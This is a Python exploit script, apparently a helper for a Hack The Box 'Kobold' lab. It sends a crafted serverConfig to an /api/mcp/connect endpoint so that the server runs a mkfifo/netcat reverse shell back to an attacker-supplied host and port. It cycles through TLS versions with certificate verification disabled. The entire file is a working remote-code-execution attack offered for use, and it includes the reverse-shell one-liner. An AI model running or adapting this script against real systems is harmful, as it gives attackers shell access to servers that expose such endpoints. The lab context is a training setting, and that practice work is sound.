#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════╗
# ║           MAVERICK - MCP RCE TLS Prober             ║
# ║         HTB Kobold - Writeup Helper Script          ║
# ╚══════════════════════════════════════════════════════╝

import requests
import ssl
import urllib3
import argparse
import sys

urllib3.disable_warnings()

BANNER = """
███╗   ███╗ █████╗ ██╗   ██╗███████╗██████╗ ██╗ ██████╗██╗  ██╗
████╗ ████║██╔══██╗██║   ██║██╔════╝██╔══██╗██║██╔════╝██║ ██╔╝
██╔████╔██║███████║██║   ██║█████╗  ██████╔╝██║██║     █████╔╝ 
██║╚██╔╝██║██╔══██║╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██║     ██╔═██╗ 
██║ ╚═╝ ██║██║  ██║ ╚████╔╝ ███████╗██║  ██║██║╚██████╗██║  ██╗
╚═╝     ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝
              HTB Kobold - MCP RCE TLS Version Prober
"""

# TLS versions in order of attempt: 1.3 first, then fallback
TLS_VERSIONS = [
    ("TLSv1.3", ssl.TLSVersion.TLSv1_3),
    ("TLSv1.2", ssl.TLSVersion.TLSv1_2),
    ("TLSv1.1", ssl.TLSVersion.TLSv1_1),
    ("TLSv1.0", ssl.TLSVersion.TLSv1),
]

def make_session(tls_version):
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.minimum_version = tls_version
    ctx.maximum_version = tls_version

    class TLSAdapter(requests.adapters.HTTPAdapter):
        def init_poolmanager(self, *args, **kwargs):
            kwargs['ssl_context'] = ctx
            super().init_poolmanager(*args, **kwargs)

    session = requests.Session()
    session.mount("https://", TLSAdapter())
    return session

def try_rce(target, lhost, lport, session):
    url = f"https://{target}/api/mcp/connect"
    payload = {
        "serverConfig": {
            "command": "sh",
            "args": [
                "-c",
                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
            ],
            "env": {}
        },
        "serverId": "maverick_rce"
    }
    resp = session.post(url, json=payload, timeout=10, verify=False)
    return resp.status_code, resp.text

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="MAVERICK - HTB Kobold MCP RCE Script")
    parser.add_argument("--target", required=True, help="Target host (e.g. mcp.kobold.htb)")
    parser.add_argument("--lhost",  required=True, help="Your HTB tun0 IP")
    parser.add_argument("--lport",  default="4444", help="Listener port (default: 4444)")
    args = parser.parse_args()

    print(f"[*] Target   : https://{args.target}")
    print(f"[*] LHOST    : {args.lhost}")
    print(f"[*] LPORT    : {args.lport}")
    print(f"[!] Make sure your listener is running: nc -lvnp {args.lport}")
    print("-" * 60)

    total = len(TLS_VERSIONS)
    for i, (label, version) in enumerate(TLS_VERSIONS, 1):
        print(f"\n[{i}/{total}] Trying {label}...")

        try:
            session = make_session(version)
            status, body = try_rce(args.target, args.lhost, args.lport, session)

            if status and status < 500:
                print(f"  [+] {label} -> SUCCESS! (HTTP {status})")
                print(f"  [+] Check your netcat listener - shell incoming!")
                print(f"  [+] Server response: {body[:200]}")
                print("\n[V] MAVERICK done. Happy hacking!\n")
                sys.exit(0)
            else:
                print(f"  [-] {label} -> Got HTTP {status}, not a clean hit.")
                if i < total:
                    next_label = TLS_VERSIONS[i][0]
                    print(f"  [~] {label} not working, moving to {next_label}...")

        except ssl.SSLError as e:
            print(f"  [-] {label} -> SSL error: {e}")
            if i < total:
                next_label = TLS_VERSIONS[i][0]
                print(f"  [~] {label} not working, moving to {next_label}...")

        except requests.exceptions.ConnectionError as e:
            print(f"  [-] {label} -> Connection error: {e}")
            if i < total:
                next_label = TLS_VERSIONS[i][0]
                print(f"  [~] {label} not working, moving to {next_label}...")

        except Exception as e:
            print(f"  [-] {label} -> Unexpected error: {e}")
            if i < total:
                next_label = TLS_VERSIONS[i][0]
                print(f"  [~] {label} not working, moving to {next_label}...")

    print("\n[-] All TLS versions exhausted. No shell obtained.")
    print("[-] Double-check target URL, LHOST, and listener.\n")
    sys.exit(1)

if __name__ == "__main__":
    main()
